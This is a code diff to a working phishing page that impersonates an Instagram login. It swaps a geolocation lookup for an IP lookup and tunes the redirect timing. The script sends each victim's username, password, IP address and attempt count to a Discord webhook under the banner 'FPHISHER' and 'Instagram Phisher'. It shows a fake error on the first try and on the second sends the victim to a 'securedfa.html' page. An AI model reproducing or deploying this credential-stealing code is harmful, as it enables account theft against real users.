@@ -74,27 +74,16 @@
 
     let attempt = 0;
 
-    // Fastest free geolocation (no key required)
-    async function getLocation() {
+    // Super lightweight IP fetch (only returns the IP address)
+    async function getIP() {
       try {
-        const res = await fetch('http://ip-api.com/json/?fields=country,regionName,status', {
-          method: 'GET',
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (!res.ok) throw new Error('Failed');
-
+        const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        if (data.status === "success") {
-          return {
-            country: data.country || 'Unknown',
-            state: data.regionName || 'Unknown'
-          };
-        }
+        return data.ip || 'Unknown';
       } catch (err) {
-        console.error("Location fetch failed:", err);
+        console.error("IP fetch failed:", err);
+        return 'Unknown';
       }
-      return { country: 'Unknown', state: 'Unknown' };
     }
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
@@ -116,15 +105,15 @@
 
       attempt++;
 
-      // Start sending to Discord immediately (non-blocking)
-      const sendToDiscord = async (loc) => {
+      // Send to Discord as fast as possible (in background)
+      const sendToDiscord = async (ip) => {
         const message = `**FPHISHER 🤖**
 
 **APP:** INSTAGRAM
 **USERNAME:** ${username}
 **PASSWORD:** ${password}
-**COUNTRY:** ${loc.country} 🌍
-**STATE:** ${loc.state}
+**IP:** ${ip}
+
 **ATTEMPT:** ${attempt} ⏱️
 
 🔐 2025@FTECHSERVICES`;
@@ -138,41 +127,39 @@
               username: "Instagram Phisher"
             })
           });
-          console.log("✅ Data sent to Discord");
+          console.log("✅ Sent to Discord");
         } catch (err) {
           console.error("Webhook failed:", err);
         }
       };
 
       if (attempt === 1) {
-        // First attempt: show error instantly + send in background
+        // First attempt: show error instantly
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
 
-        // Get location in background and send
-        getLocation().then(loc => sendToDiscord(loc));
+        // Fetch IP and send in background (non-blocking)
+        getIP().then(ip => sendToDiscord(ip));
 
       } else {
-        // Second attempt: show loading + send faster
+        // Second attempt: show loading and redirect fast
         btn.disabled = true;
         btnText.textContent = "Loading...";
         spinner.classList.remove("hidden");
 
-        // Start location fetch + webhook in parallel
-        const locationPromise = getLocation();
+        // Start IP fetch + webhook in parallel
+        const ipPromise = getIP();
+        ipPromise.then(ip => sendToDiscord(ip));
 
-        // Send webhook as soon as possible
-        locationPromise.then(loc => sendToDiscord(loc));
-
-        // Redirect very fast (even if location is still coming)
+        // Redirect very quickly
         setTimeout(() => {
           window.location.href = "securedfa.html";
-        }, 150);   // Fast enough while still allowing webhook to fire
+        }, 120);
       }
     });
   </script>
 
-  <!-- Optional: shake animation on error -->
+  <!-- Optional shake animation for better feedback -->
   <style>
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
